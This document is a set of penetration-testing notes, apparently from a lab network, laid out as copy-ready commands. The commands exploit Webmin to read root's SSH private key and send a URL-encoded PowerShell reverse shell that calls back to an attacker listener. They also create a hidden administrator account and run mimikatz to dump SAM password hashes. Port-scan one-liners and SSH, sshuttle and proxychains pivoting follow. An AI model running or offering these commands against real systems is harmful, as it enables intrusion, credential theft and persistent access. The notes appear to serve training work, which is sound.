On Compromised Macine:
python3 $webminexploit.py -i 10.200.67.200 -p 10000 -c "cat /root/.ssh/id_rsa

ON Attacking Machine:
nano id_rsa
chmod 600 id_rsa

sshuttle -r root@10.200.67.200 — ssh-cmd “ssh -i id_rsa” 10.200.67.0/24 -x 10.200.67.200

On Compromised Machine:
firewall-cmd — zone=public — add-port 16000/tcp
nc -lvnp 16000

On Attacking Machine:
curl -X POST http://10.200.87.150/web/exploit.php -d a=powershell.exe%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.200.87.200%27%2C16000%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22


In Compromised Machine:


net user USERNAME PASSWORD \add

net localgroup Administrators USERNAME /add

net localgroup “Remote Management Users” USERNAME /add

Once done we can now access this machine via CLI (Evil-Winrm) or RDP.


on Attacking Machine:
xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share

In Remote Desktop:
Run command as Administrator
\\tsclient\share\mimikatz\x64\mimikatz.exe

privilege::debug

token::elevate

lsadump::sam
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------


for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep “bytes from” &); done

for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done

-------------------------------------------------------------------------------------------------------

proxychains nc [target-ip]

 /etc/proxychains.conf or /etc/proxychains/proxychains.conf.

--------------------------------------------------------------

SSH Tunneling/Port Forwarding:

Forward Connection:
ssh -L [local-port]:[target-ip]:[target-port] [user]@[target-ip]

ssh -D [proxy-port] [user]@[target-ip]

Reverse Connection:
They are riskier as you must access your attacking machine from the target. Then we need to create a key-pair using ssh-keygen and then copy the public key(.pub) in ~/.ssh/authorized_keys.
And before pasting the key, type the following on a new line:

command=”echo ‘This account can only be used for port forwarding’”,no-agent-forwarding,no-x11-forwarding,no-pty

And now you can connect via ssh and using the -R flag.

Command: ssh -R local-port]:[target-ip]:[target-port] [user]@[attacker-IP]

------------------------------------------------------------------------------

plink.exe

Similarly for ssh-keygen we have puttygen.

------------------------------------------

































-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

ProxyChains: This tool will allow us to connect with the target via proxy network. But proxychains often slow down the connection due to which scanning and working becomes difficult.

It’s a command line tool and we can use it using the following command

proxychains nc [target-ip]

Here we do not specify the port as proxychains reads it from its config file which is available in /etc/proxychains.conf or /etc/proxychains/proxychains.conf.

Here all we need to do is just set the type of proxy SOCKS4 or SOCKS 5 and specify the port to use. Also, you can check and read about the proxy DNS.

Note: You can use only TCP Scan and the scan will be extremely slow.

FoxyProxy: ProxyChains is good when you are working on CLI, but if you are working in a web browser then we have an extension called foxyproxy which is similar and easier to use.
